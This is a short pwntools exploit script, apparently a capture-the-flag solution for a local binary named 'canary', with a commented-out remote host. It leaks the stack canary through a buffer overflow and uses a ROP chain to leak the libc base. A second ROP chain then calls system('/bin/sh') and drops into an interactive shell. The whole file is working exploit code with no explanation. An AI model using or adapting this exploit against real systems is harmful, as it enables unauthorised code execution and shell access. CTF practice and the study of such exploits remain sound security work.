from pwn import *
context.log_level="debug"
context.binary = "./canary"
p=process("./canary")
#p=remote("10.21.13.69",10007)
elf=ELF("./canary")
libc=elf.libc

main_addr=0x400626
pop_rdi_ret=0x0400713
print_plt=0x4004e0
read_got=0x601028
fflush=0x601038


payload="A"*40+'x'
p.send(payload)

canary=u64(p.read()[-11:-3])-0x78
print "canary:",hex(canary)


payload="A"*39+'\n'+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(fflush)+p64(print_plt)+p64(main_addr)
p.sendline(payload)

p.recvline()
base=u64(p.read()[-6:].ljust(8,"\x00"))-libc.symbols['fflush']
libc.address=base;

print hex(libc.search("/bin/sh").next())
print hex(base)
print hex(libc.symbols["system"])

p.send('\n')
#gdb.attach(p)
payload="A"*40+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p.sendline(payload)

p.interactive()
